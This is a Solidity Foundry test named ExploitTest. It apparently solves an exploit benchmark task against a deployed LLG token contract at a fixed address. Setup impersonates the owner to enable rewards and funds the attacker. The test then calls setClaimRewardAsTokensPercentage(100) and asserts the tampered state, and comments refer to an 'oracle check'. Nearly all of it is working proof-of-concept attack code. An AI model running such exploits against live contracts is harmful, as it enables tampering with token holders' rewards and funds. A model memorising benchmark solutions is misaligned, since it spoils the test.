// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface LLG {
    function owner() external view returns (address);
    function activate() external;
    function setRewardAsTokensEnabled(bool) external;
    function setAutoClaimEnabled(bool) external;
    function setMinRewardBalance(uint256) external;
    function setExcludedFromRewards(address, bool) external;
    function setClaimRewardAsTokensPercentage(uint256) external;
    function claimRewardAsTokensPercentage(address) external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xE4C293Eadbb9d72d68a680F1A66979726992c396;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the contract owner
        address owner = LLG(TARGET).owner();

        // Impersonate owner to activate contract
        vm.startPrank(owner);
        LLG(TARGET).activate();
        LLG(TARGET).setRewardAsTokensEnabled(true);
        LLG(TARGET).setAutoClaimEnabled(true);
        LLG(TARGET).setMinRewardBalance(50000 * 10**9);
        vm.stopPrank();

        // Give attacker enough LLG tokens to be included in rewards
        // Need at least minRewardBalance = 50000 * 10^9 tokens
        uint256 minTokens = 50000 * 10**9;
        deal(TARGET, attacker, minTokens * 2); // Give double to be safe

        // Fund contract with BNB for rewards (mainBnbPoolSize = 5000 ether)
        deal(address(TARGET), 6000 ether); // Slightly more than 5000 ether

        // Ensure attacker is not excluded from rewards
        vm.prank(owner);
        LLG(TARGET).setExcludedFromRewards(attacker, false);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Call the vulnerable function to set our percentage to 100%
        LLG(TARGET).setClaimRewardAsTokensPercentage(100);

        // Step 2: Verify the percentage was set correctly
        uint256 percentage = LLG(TARGET).claimRewardAsTokensPercentage(attacker);
        require(percentage == 100, "Percentage not set to 100%");

        // Step 3: (Optional) Trigger a reward claim to demonstrate the effect
        // First need to ensure we're eligible for rewards and reward is ready
        // This would require more setup (waiting for reward cycle, etc.)
        // But for the oracle check, we just need to verify the percentage is 100%

        // The oracle will check: LLG.claimRewardAsTokensPercentage(attacker_address) == 100
        // We've already set it and verified it
        assertEq(LLG(TARGET).claimRewardAsTokensPercentage(attacker), 100, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

